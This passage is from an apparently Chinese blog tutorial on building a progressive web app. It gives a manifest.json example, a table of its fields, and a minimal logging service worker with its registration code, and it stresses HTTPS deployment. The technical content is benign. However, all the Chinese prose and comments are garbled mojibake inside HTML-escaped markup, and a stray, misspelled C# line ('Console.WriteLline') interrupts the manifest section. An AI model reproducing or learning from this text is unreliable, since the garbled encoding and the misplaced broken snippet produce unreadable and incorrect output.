&lt;p&gt;&lt;strong&gt;manifest.json&lt;/strong&gt; æ–‡ä»¶æ˜¯ Web ç«™ç‚¹çš„æè¿°æ–‡ä»¶ï¼Œç”¨æ¥å‘Šè¯‰æµè§ˆå™¨ PWAåº”ç”¨ çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬åç§°ã€å›¾æ ‡ã€å¯åŠ¨é¡µã€èƒŒæ™¯è‰²ç­‰ç­‰ã€‚å®Œæ•´çš„ manifest.json é…ç½®è¯·å‚çœ‹ &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.mozilla.org/en-US/docs/Web/Manifest&quot;&gt;Web App Manifest properties&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨å·¥ç¨‹çš„æ ¹è·¯å¾„ä¸­åˆ›å»º &lt;strong&gt;manifest.json&lt;/strong&gt; æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;    &lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;æ¬¢è¿æ¥åˆ° Vinny Blog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;short_name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vinny Blog&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start_url&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;display&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;standalone&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;orientation&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;portrait&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;background_color&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#ccc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;theme_color&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#5FAAE5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;è¿™æ˜¯ä¸€ä¸ªç®€å•æµ‹è¯•çš„pwaåº”ç”¨&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;icons&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;src&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/assets/icons/icon-72x72.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sizes&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;72x72&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;çœç•¥&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;åƒç´ icon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…·ä½“å±æ€§é‡Šä¹‰ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;åç§°&lt;/th&gt;
      &lt;th&gt;å«ä¹‰&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;name&lt;/td&gt;
      &lt;td&gt;æ˜¾ç¤ºåœ¨â€Add Home Screenâ€çš„æ¨ªå¹…ä¸­&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;short_name&lt;/td&gt;
      &lt;td&gt;æ¡Œé¢appçš„åç§°&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;display&lt;/td&gt;
      &lt;td&gt;ä¸ºstandaloneåˆ™éšè—æµè§ˆå™¨UIï¼Œbowseråˆ™ç›¸å&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;orientation&lt;/td&gt;
      &lt;td&gt;ç•Œé¢çš„åˆå§‹æ–¹å‘ï¼Œportraitç«–å±ï¼Œlandscapeæ¨ªå±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;background_color&lt;/td&gt;
      &lt;td&gt;appå¯åŠ¨ç”»é¢çš„èƒŒæ™¯é¢œè‰²&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;theme_color&lt;/td&gt;
      &lt;td&gt;appçŠ¶æ€æ èƒŒæ™¯è‰²&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;å¦‚æœè§‰å¾—æ‰‹å†™ &lt;strong&gt;manifest.json&lt;/strong&gt; æ–‡ä»¶è¿‡äºç¹çï¼Œå¯ä»¥ä½¿ç”¨åœ¨çº¿ç”Ÿæˆ &lt;a href=&quot;https://app-manifest.firebaseapp.com/&quot;&gt;Web App Manifest Generator&lt;/a&gt; çš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;42-é¦–é¡µæ–‡ä»¶æ³¨å†Œ-manifestjson&quot;&gt;4.2 é¦–é¡µæ–‡ä»¶æ³¨å†Œ manifest.json&lt;/h3&gt;

&lt;p&gt;åˆ›å»ºå¥½çš„ &lt;strong&gt;manifest.json&lt;/strong&gt; æ–‡ä»¶ï¼Œéœ€è¦åœ¨ &lt;strong&gt;index.html&lt;/strong&gt; é¦–é¡µçš„ &lt;em&gt;link&lt;/em&gt; æ ‡ç­¾ä¸­è¿›è¡Œå®šä¹‰ï¼Œè¿™æ ·æµè§ˆå™¨æ‰ä¼šè¿›è¡Œè¯»å–ã€‚&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    ...

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- æ³¨å†Œ manifest.json æ–‡ä»¶ --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manifest&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/manifest.json&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- åº”ä¸ manifest.json ä¸­çš„ theme_colorå±æ€§ ä¸€è‡´ --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;theme-color&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#5FAAE5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;format-detection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;telephone=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;msapplication-tap-highlight&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    ...
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¿™æ ·çš„é…ç½®å¯¹äº &lt;strong&gt;Chrome&lt;/strong&gt; æµè§ˆå™¨è¶³å¤Ÿä½¿ç”¨äº†ï¼Œä½†å¯¹äº IOS ç³»ç»Ÿçš„ &lt;strong&gt;safari&lt;/strong&gt; æµè§ˆå™¨ä»ç„¶ä¸è¡Œï¼ŒIOS ç³»ç»Ÿåœ¨ 11.3 ç‰ˆæœ¬ä¹‹åæ‰å¼€å§‹å¯¹ PWA åº”ç”¨çš„æ”¯æŒï¼Œä½†ä»ç„¶æœ‰ä¸å°‘é—®é¢˜ï¼Œå…·ä½“åœ¨å¦‚ä½•é€‚é…è¯·å‚çœ‹ &lt;strong&gt;é™„å½•B PWAåœ¨IOSä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;43-æœåŠ¡å·¥ä½œæ–‡ä»¶&quot;&gt;4.3 æœåŠ¡å·¥ä½œæ–‡ä»¶&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;ServiceWorker&lt;/strong&gt; å³å·¥ä½œçº¿ç¨‹ï¼Œç®€ç§° &lt;strong&gt;sw&lt;/strong&gt;ï¼Œå½“è®¿é—®ç«™ç‚¹æ—¶ä¼šä»¥æ­¤åŸŸåå°† &lt;strong&gt;sw&lt;/strong&gt; è¿›è¡Œæ³¨å†Œï¼Œä¸€æ—¦è¿›è¡Œæ³¨å†Œåˆ™ä¼šåœ¨æµè§ˆå™¨ä¸­å½¢æˆå¸¸é©»çš„å·¥ä½œçº¿ç¨‹ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ &lt;strong&gt;sw&lt;/strong&gt; ä¸èƒ½ç›´æ¥æ“ä½œ DOM å…ƒç´ ï¼Œå®ƒæ›´åƒä¸ªä»£ç†ç¨‹åºï¼Œç”¨æ¥è½¬å‘æ•°æ®ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;æŸ¥çœ‹å½“å‰æµè§ˆå™¨å·²ç»æ³¨å†Œçš„æœåŠ¡å·¥ä½œçº¿ç¨‹ &lt;strong&gt;chrome://serviceworker-internals&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨å·¥ç¨‹æ ¹è·¯å¾„ä¸­åˆ›å»º &lt;strong&gt;service-worker.js&lt;/strong&gt; æ–‡ä»¶ï¼Œæ–‡ä»¶çš„æ‰€åœ¨è·¯å¾„ä¸ä½œç”¨åŸŸ scope ç›¸å…³ï¼Œæ³¨å†Œåœ¨é‚£ä¸ªè·¯å¾„é‡Œï¼Œå°±åªèƒ½å¯¹æ­¤è·¯å¾„æœ‰è®¿é—®æƒé™ï¼Œåœ¨æ ¹è·¯å¾„ä¸­è¡¨ç¤ºå¯¹æ•´ä¸ªç«™ç‚¹æœ‰æ•ˆã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢æ˜¯ &lt;strong&gt;service-worker.js&lt;/strong&gt; æ–‡ä»¶æ˜¯ä¸€ä¸ªç®€å•çš„å®ç°ï¼š&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// å®‰è£…äº‹ä»¶&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'install'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker Install'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// æ¿€æ´»äº‹ä»¶&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker Activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// è¯·æ±‚äº‹ä»¶&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;44-è„šæœ¬æ–‡ä»¶ä¸­æ³¨å†Œ-service-workerjs&quot;&gt;4.4 è„šæœ¬æ–‡ä»¶ä¸­æ³¨å†Œ service-worker.js&lt;/h3&gt;

&lt;p&gt;è„šæœ¬æ–‡ä»¶æ˜¯ç«™ç‚¹çš„å…¶ä»– js æ–‡ä»¶ï¼Œåœ¨æ­¤æ–‡ä»¶ä¸­è¿›è¡Œ sw çš„æ³¨å†Œï¼Œæ‰å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œæ³¨å†Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// åˆ¤æ–­æµè§ˆå™¨æ˜¯å¦æ”¯æŒ ServiceWorker&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'serviceWorker'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'load'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// æ³¨å†Œ&quot;serviceWorker&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serviceWorker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/service-worker.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker registration success with scope: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;registration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Service Worker registration failed: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;45-å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸­&quot;&gt;4.5 å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸­&lt;/h3&gt;

&lt;p&gt;æŒ‰ç« èŠ‚ &lt;strong&gt;3. åŸºæœ¬ç»„æˆç»“æ„&lt;/strong&gt; ä¸­çš„å›¾ï¼Œè‡³æ­¤å‡†å¤‡å·¥ä½œç»“æŸï¼Œä¸€ä¸ªåŸºæœ¬çš„ &lt;strong&gt;PWA&lt;/strong&gt; åº”ç”¨å·²ç»å®Œæˆï¼Œç°åœ¨å¯ä»¥å°†æ•´ä¸ªç«™ç‚¹å‘å¸ƒåˆ° nginxã€apacheç­‰æœåŠ¡å™¨ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œ&lt;strong&gt;&lt;u&gt;æ­£ç¡®çš„ PWA åº”ç”¨åº”è¯¥éƒ¨ç½²åœ¨ HTTPS çš„ç¯å¢ƒä¸‹ï¼Œå³ä½ éœ€è¦å®‰å…¨è¯ä¹¦&lt;/u&gt;&lt;/strong&gt;ï¼Œä¸æ”¯æŒè‡ªç­¾åè¯ä¹¦ï¼Œå…³äºå¦‚ä½•è·å–å…è´¹çš„ HTTPS è¯ä¹¦è¯·å‚çœ‹å¦ä¸€ç¯‡æ–‡ç«  &lt;a href=&quot;https://vinny.cc/2017/10/lets-encrypt-ssl/&quot;&gt;ä½¿ç”¨Lets Encryptä¸ºç«™ç‚¹å¿«é€Ÿéƒ¨ç½²SSLè¯ä¹¦&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;è®¿é—®çš„æˆªå›¾å¦‚ä¸‹ï¼š&lt;/strong&gt;&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;
&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/Screenshot_20180418-004321.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;

